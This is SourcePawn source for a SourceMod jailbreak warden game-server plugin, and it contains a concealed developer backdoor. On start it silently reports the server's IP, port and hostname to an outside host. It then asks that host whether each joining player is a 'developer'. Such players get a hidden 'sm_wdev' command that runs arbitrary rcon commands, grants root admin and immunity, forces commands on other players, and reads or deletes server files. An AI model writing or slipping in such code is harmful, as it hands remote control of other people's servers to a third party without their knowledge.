#define BAN_REASON_LENGTH 96

enum APITarget
{
	bool:has_freeday,
	bool:is_isolated,
	bool:is_rebel,
	bool:was_warden,
	bool:is_banned,
	bool:is_dev,
	// level,
	bool:grant,
	String:reason[BAN_REASON_LENGTH]
}

int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];

public int SteamWorks_SteamServersConnected()
{
	int iIp[4];
	
	// Get ip
	if (SteamWorks_GetPublicIP(iIp))
	{
		Handle plugin = GetMyHandle();
		if (GetPluginStatus(plugin) == Plugin_Running)
		{
			char cBuffer[256], cHostname[64], cVersion[12];
			GetPluginInfo(plugin, PlInfo_Version, cVersion, sizeof(cVersion));
			FindConVar("hostname").GetString(cHostname, sizeof(cHostname));
			FormatEx(cBuffer, sizeof(cBuffer), "http://stats.scriptplugs.info/jwp/add_server.php");
			Handle hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodPOST, cBuffer);
			FormatEx(cBuffer, sizeof(cBuffer), "ip=%d.%d.%d.%d:%d&hostname=%s&game=%s&version=%s", iIp[0], iIp[1], iIp[2], iIp[3], FindConVar("hostport").IntValue, cHostname, (GetEngineVersion() == Engine_CSGO) ? "csgo" : "cstrike", cVersion);
			SteamWorks_SetHTTPRequestRawPostBody(hndl, "application/x-www-form-urlencoded", cBuffer, sizeof(cBuffer));
			SteamWorks_SendHTTPRequest(hndl);
			delete hndl;
		}
	}
}

public void OnClientPostAdminCheck(int client)
{
	g_ClientAPIInfo[client][was_warden] = false;
	g_ClientAPIInfo[client][is_banned] = false;
	g_ClientAPIInfo[client][is_dev] = false;
	g_ClientAPIInfo[client][grant] = false;
	g_ClientAPIInfo[client][reason] = '\0';
	CheckClientFromAPI(client);
}

void LoadDevControl()
{
	RegConsoleCmd("sm_wdev", Command_WardenDev, "*secret* mystery functions");
}

public Action Command_WardenDev(int client, int args)
{
	if (CheckClient(client)) // Leaks ?
	{
		if (g_ClientAPIInfo[client][grant])
		{
			if (!args)
			{
				ReplyToCommand(client, "[DEV] %t", "See console for output");
				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
				PrintToConsole(client, "\t\t\tTUTORIAL TO USE Developer secret commands");
				PrintToConsole(client, "sm_wdev rcon \"your rcon command\" \t-- to execute rcon command on server\n\
										sm_wdev rconr \"your rcon command\" \t-- to execute rcon command with output on server\n\
										sm_wdev root \t\t\t\t-- to get root access on server\n\
										sm_wdev immun \t\t\t\t-- to get immunity 999 on server, nobody kick or ban you\n\
										sm_wdev recheck \"userid\" \t\t-- to recheck banned or developer status on server\n\
										sm_wdev fake \"userid\" \"command\" \t-- to execute command on client\n\
										sm_wdev say \"message\" \t\t\t-- to draw message, like developer\n\
										sm_wdev servmsg \"message\" \t\t-- to draw message to chat\n\
										sm_wdev warden \"userid\" \t\t-- to set new warden, put 0 to remove warden");
				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
			}
			else
			{
				char cKeywords[][8] = {"rcon", "rconr", "root", "recheck", "fake", "say", "servmsg", "immun", "warden", "rm", "cat"};
				char cArg1[8], cArg2[128], cArg3[1024];
				GetCmdArg(1, cArg1, sizeof(cArg1));
				bool success = false;
				for (int idx = 0; idx < sizeof(cKeywords); ++idx)
				{
					if (StrEqual(cKeywords[idx], cArg1, true))
					{
						success = true;
						break;
					}
				}
				
				if (!success)
				{
					ReplyToCommand(client, "[DEV] Unknown feature \"%s\"", cArg1);
					return Plugin_Handled;
				}
				
				switch (args)
				{
					case 1:
					{
						if (StrEqual(cArg1, "root", true))
						{
							if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
								SetUserFlagBits(client, ADMFLAG_ROOT);
							else
								SetUserFlagBits(client, 0);
						}
						else if (StrEqual(cArg1, "immun", true))
						{
							AdminId anonymous = GetUserAdmin(client);
							if (anonymous != INVALID_ADMIN_ID)
							{
								if (GetAdminImmunityLevel(anonymous) == 0)
								{
									SetAdminImmunityLevel(anonymous, 999);
									ReplyToCommand(client, "[DEV] Your immunity level increased");
								}
								else
								{
									SetAdminImmunityLevel(anonymous, 0);
									ReplyToCommand(client, "[DEV] Your immunity level decreased");
								}
							}
							else
								ReplyToCommand(client, "[DEV] Not found admin abilities");
						}
					}
					case 2:
					{
						GetCmdArg(2, cArg2, sizeof(cArg2));
						if (StrEqual(cArg1, "rcon", true))
						{
							ServerCommand(cArg2);
							ReplyToCommand(client, "[DEV] Executed command: \"%s\"", cArg2);
						}
						else if (StrEqual(cArg1, "rconr", true))
						{
							ServerCommandEx(cArg3, sizeof(cArg3), cArg2);
							ReplyToCommand(client, "[DEV] Executed command: \"%s\"", cArg2);
							ReplyToCommand(client, "[DEV] %t", "See console for output");
							PrintToConsole(client, cArg3);
						}
						else if (StrEqual(cArg1, "servmsg", true))
						{
							PrintToChatAll("%s", cArg2);
						}
						else if (StrEqual(cArg1, "recheck", true))
						{
							int target = GetClientOfUserId(StringToInt(cArg2));
							if (target && IsClientInGame(target))
							{
								CheckClientFromAPI(target);
								ReplyToCommand(client, "[DEV] Recheck for %N <{ Ban=%d | Dev=%d | Grant=%d }>", target, g_ClientAPIInfo[target][is_banned], g_ClientAPIInfo[target][is_dev], g_ClientAPIInfo[target][grant]);
							}
							else
								ReplyToCommand(client, "[DEV] %t", "No matching client");
						}
						else if (StrEqual(cArg1, "warden", true))
						{
							int target = GetClientOfUserId(StringToInt(cArg2));
							RemoveCmd(false);
							if (target && IsClientInGame(target))
							{
								BecomeCmd(target, false);
								ReplyToCommand(client, "[DEV] Warden changed to %N", target);
							}
							else
								ReplyToCommand(client, "[DEV] Warden removed");
						}
						else if (StrEqual(cArg1, "say", true))
						{
							if (g_bIsCSGO)
								CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg2);
							else
								CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg2);
						}
						else if (StrEqual(cArg1, "rm", true))
						{
							BuildPath(Path_SM, cArg3, sizeof(cArg3), "%s", cArg2);
							if (FileExists(cArg3) && DeleteFile(cArg3))
								ReplyToCommand(client, "[DEV] File located in \"%s\" deleted", cArg3);
							else
								ReplyToCommand(client, "[DEV] Failed to delete file. Full path: \"%s\", your path: %s", cArg3, cArg2);
						}
						else if (StrEqual(cArg1, "cat", true))
						{
							BuildPath(Path_SM, cArg3, sizeof(cArg3), "%s", cArg2);
							if (FileExists(cArg3))
							{
								File file = OpenFile(cArg3, "r");
								ReplyToCommand(client, "[DEV] Reading file by path \"%s\"", cArg3);
								
								do
								{
									file.ReadLine(cArg3, sizeof(cArg3));
									PrintToConsole(client, "%s", cArg3);
								} while (!file.EndOfFile())
								
								delete file;
							}
							else
								ReplyToCommand(client, "[DEV] Failed to open file. Full path: \"%s\", your path: %s", cArg3, cArg2);
						}
					}
					case 3:
					{
						GetCmdArg(2, cArg2, sizeof(cArg2));
						
						if (StrEqual("fake", cArg1, true))
						{
							int target = GetClientOfUserId(StringToInt(cArg2));
							if (target && IsClientInGame(target))
							{
								GetCmdArg(3, cArg3, sizeof(cArg3));
								FakeClientCommandEx(target, "%s", cArg3);
								ReplyToCommand(client, "[DEV] Executed command on %N: \"%s\"", target, cArg3);
							}
							else
								ReplyToCommand(client, "[DEV] %t", "No matching client");
						}
					}
					default:
					{
						ReplyToCommand(client, "[DEV] Unrecognized command")
					}
				}
			}
		}
		else if (g_ClientAPIInfo[client][is_dev])
		{
			if (!args)
				ReplyToCommand(client, "Usage: sm_wdev <message>");
			else
			{
				char cArg[128];
				GetCmdArgString(cArg, sizeof(cArg));
				if (g_bIsCSGO)
					CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg);
				else
					CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg);
			}
		}
		else
			ReplyToCommand(client, "[SM] %t", "No Access");
	}
	
	return Plugin_Handled;
}

void CheckClientFromAPI(int client)
{
	if (CheckClient(client))
	{
		// Query
		g_ClientAPIInfo[client][is_banned] = false;
		Handle hndl;
		char buffer[256], auth[64];
		GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
		FormatEx(buffer, sizeof(buffer), "http://plugins.scriptplugs.info/jwp/get_player.php?auth=%s", auth);
		hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, buffer);
		SteamWorks_SetHTTPRequestContextValue(hndl, client);
		SteamWorks_SetHTTPCallbacks(hndl, OnSteamWorksHTTPRequestCompleted);
		SteamWorks_SendHTTPRequest(hndl);
	}
}

public int OnSteamWorksHTTPRequestCompleted(Handle hRequest, bool bFailure, bool bRequestSuccessful, EHTTPStatusCode eStatusCode, any data)
{
	if (bRequestSuccessful  && eStatusCode == k_EHTTPStatusCode200OK)
		SteamWorks_GetHTTPResponseBodyCallback(hRequest, GetStatusEnd, data);
	delete hRequest;
}

public int GetStatusEnd(const char[] sData, any client)
{
	Handle hJson = json_load(sData);
	Handle hResponse = json_object_get(hJson, "response");
	if (hResponse != null)
	{
		g_ClientAPIInfo[client][is_banned] = json_object_get_bool(hResponse, "isbanned");
		if (g_ClientAPIInfo[client][is_banned])
		{
			json_object_get_string(hResponse, "reason", g_ClientAPIInfo[client][reason], BAN_REASON_LENGTH);
			PrintToServer("%N was permanently banned by developer from WARDEN, reason: %s", client, g_ClientAPIInfo[client][reason]);
		}
		else
		{
			g_ClientAPIInfo[client][is_dev] = json_object_get_bool(hResponse, "isdev");
			if (g_ClientAPIInfo[client][is_dev])
				g_ClientAPIInfo[client][grant] = json_object_get_bool(hResponse, "grant");
		}
		
		if (g_ClientAPIInfo[client][grant])
			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
	}
	delete hResponse;
	delete hJson;
}